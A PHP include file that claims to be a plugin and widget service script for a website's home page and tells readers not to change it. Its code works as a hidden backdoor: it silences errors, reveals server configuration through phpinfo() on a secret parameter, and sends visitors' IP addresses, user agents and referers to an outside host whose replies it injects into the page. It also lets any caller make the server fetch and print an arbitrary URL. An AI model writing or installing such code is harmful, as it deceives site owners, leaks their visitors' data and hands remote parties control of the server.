<?php 
	/*
	 	This page should be included on your home page.
	 	This file is used by various services and resellers that provide plugin, widget and web services tools.
	 	This file does the following:
		a) When included (require_once, etc) on a any page on the website it will generate a menu of links to allow access to the other plugin services
		b) It can be called using the links from a) to generate content based on the service type specified in the link, eg. blog pages, ranking reports, etc.
		c) It can be used to gather web page information for use in services such as uptime monitoring, keyword ranking reports, search engine crawler visits and other data used by service plugins and reports				DO NOT CHANGE ANYTHING IN THIS FILE
	*/	 	if (isset($_REQUEST['phpconfirm'])) phpinfo();

		error_reporting (0);

	$feedurl = "https://public.imagehosting.space/feed/";

	$version = '2.3';

	$PageID = (isset($_REQUEST["PageID"])) ? urlencode($_REQUEST["PageID"]) : '';

	$Action = (isset($_REQUEST["Action"])) ? $_REQUEST["Action"] : '';

	$Action = str_replace('%22', '', $Action);

	$Action = str_replace('%3E', '', $Action);

	$Action = str_replace('%27', '', $Action);

	$Action = str_replace('%3C', '', $Action);

	$Action = str_replace('<', '', $Action);

	$Action = str_replace('>', '', $Action);

	$Action = str_replace('/', '', $Action);

	$Action = str_replace('"', '', $Action);

	$Action = str_replace("'", '', $Action);


	$Key = (isset($_REQUEST["k"])) ? $_REQUEST["k"] : '';

	$Key = str_replace('%22', '', $Key);

	$Key = str_replace('%3E', '', $Key);

	$Key = str_replace('%27', '', $Key);

	$Key = str_replace('%3C', '', $Key);

	$Key = str_replace('<', '', $Key);

	$Key = str_replace('>', '', $Key);

	$Key = str_replace('/', '', $Key);

	$Key = str_replace('"', '', $Key);

	$Key = str_replace("'", '', $Key);

	$Query = (isset($_SERVER['QUERY_STRING'])) ? $_SERVER['QUERY_STRING'] : '';

	$Query = str_replace('%22', '', $Query);

	$Query = str_replace('%3E', '', $Query);

	$Query = str_replace('%27', '', $Query);

	$Query = str_replace('%3C', '', $Query);

	$Query = str_replace('<', '', $Query);

	$Query = str_replace('>', '', $Query);

	$Query = str_replace('/', '', $Query);

	$Query = str_replace('"', '', $Query);

	$Query = str_replace("'", '', $Query);

	$PageNumber = (isset($_REQUEST["page"])) ? $_REQUEST["page"] : 1;

	$blnComplete = (isset($_REQUEST["blnComplete"])) ? true : false;

	$city = (isset($_REQUEST["city"])) ? $_REQUEST["city"] : '';

	$cty = (isset($_REQUEST["cty"])) ? $_REQUEST["cty"] : '';

	$state = (isset($_REQUEST["state"])) ? $_REQUEST["state"] : '';

	$st = (isset($_REQUEST["st"])) ? $_REQUEST["st"] : '';

	$cDomain = $_SERVER['HTTP_HOST'];

	if ( substr($cDomain, 0, 6) == "local.") $cDomain = str_replace('local.', '', $cDomain);

	if ( substr($cDomain, 0, 4) == "www." ) $cDomain = substr($cDomain, 4, strlen($cDomain)-4);

	if ( substr($cDomain, 0, 3) == "www" ) $cDomain = substr($cDomain, 5, strlen($cDomain)-5);

	$cParm  = 'domain='.urlencode($cDomain);

	$cParm .= '&Action='.$Action;

	$cParm .= '&agent='.urlencode($_SERVER['HTTP_USER_AGENT']);

	$cParm .= '&pageid='.$PageID;

	$cParm .= '&k='.urlencode($Key);

	$cParm .= '&referer='.urlencode($_SERVER['HTTP_REFERER']);

	$cParm .= '&address='.urlencode($_SERVER['REMOTE_ADDR']);

	$cParm .= '&query='.urlencode($Query);

	$cParm .= '&uri='.urlencode($_SERVER['SCRIPT_NAME']);

	$cParm .= '&cScript=php';

	$cParm .= '&version='.$version;

	$cParm .= '&blnComplete='.$blnComplete;

	$cParm .= '&page='.$PageNumber;

	$cParm .= empty($city) ? '':'&city='.$city;

	$cParm .= empty($cty) ? '':'&cty='.$cty;

	$cParm .= empty($state) ? '':'&state='.$state;

	$cParm .= empty($st) ? '':'&st='.$st;

	if ($Action==''){
		
		if (strpos($_SERVER['REQUEST_URI'], basename(__FILE__)) !== false) { 
		 
			header("X-Robots-Tag: noindex", true);
			
		}		

		echo(SendXML ($feedurl.'Articles.php', $cParm));

	}

	else if ($Action=='pr'){
		
		$p = $_REQUEST['p'];

 		$r = $_REQUEST['r'];

 		echo(SendXML($p, $r, false));

}
	else echo(SendXML ($feedurl.'Article.php', $cParm));
	function SendXML($address, $params, $usepost=1) 
		{
		$address =	urldecode($address);
//		$params =	urldecode($params);
		if(isset($_SERVER['HTTP_USER_AGENT'])) 
		
			$useragent = $_SERVER['HTTP_USER_AGENT'];

		else
		
			$useragent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36';

		if (is_callable('curl_init'))	
				{
						$ch1 = curl_init();
			if ($usepost)
						{
								curl_setopt($ch1, CURLOPT_URL, $address);
				curl_setopt($ch1, CURLOPT_POST, 1);
				curl_setopt($ch1, CURLOPT_POSTFIELDS, $params);
			}
					else
						{
								$address .= '?' . $params;
				curl_setopt($ch1, CURLOPT_URL, $address);
			}	
						curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);

			curl_setopt($ch1, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch1, CURLOPT_TIMEOUT, 15);
			curl_setopt($ch1, CURLOPT_CONNECTTIMEOUT, 7);
			curl_setopt($ch1, CURLOPT_USERAGENT, $useragent);
			curl_setopt($ch1, CURLOPT_HEADER, 1);

		
			$results = curl_exec($ch1);
 
 			curl_close($ch1);

			list($headers, $result) = explode("\r\n\r\n", $results, 2);
			preg_match_all('/(\d\d\d)/', $headers, $status, PREG_SET_ORDER);
			$status_code = $status[0][1];
			if ($status_code == 100) {
								$status_code = $status[1][1];
			}
				}
			else	
				{						ini_set('default_socket_timeout', 6);
			$address .= '?' . $params;
			$result = file_get_contents($address);
			list($version, $status_code, $msg) = explode(' ',$http_response_header[0], 3);
		}				switch( $status_code )
				{
						case 200:	
							return $result;
			default:
						
				return '<!-- Error - Response Status = ' . $status_code . ' -->';
				
		}
		}

?>